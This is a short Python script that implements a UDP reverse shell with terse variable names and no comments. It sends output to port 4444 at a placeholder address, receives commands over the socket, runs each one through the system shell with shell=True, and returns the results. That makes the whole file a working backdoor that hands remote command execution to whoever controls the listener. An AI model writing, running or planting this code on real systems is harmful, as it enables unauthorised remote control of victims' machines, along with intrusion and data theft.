import socket as s
import subprocess as r
so=s.socket(s.AF_INET,s.SOCK_DGRAM)
o=b''
while True:
	so.sendto(o,('0.0.0.0',4444))
	d=so.recv(1024)
	if len(d)==0:
		break
	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
	o=p.stdout.read()+p.stderr.read()
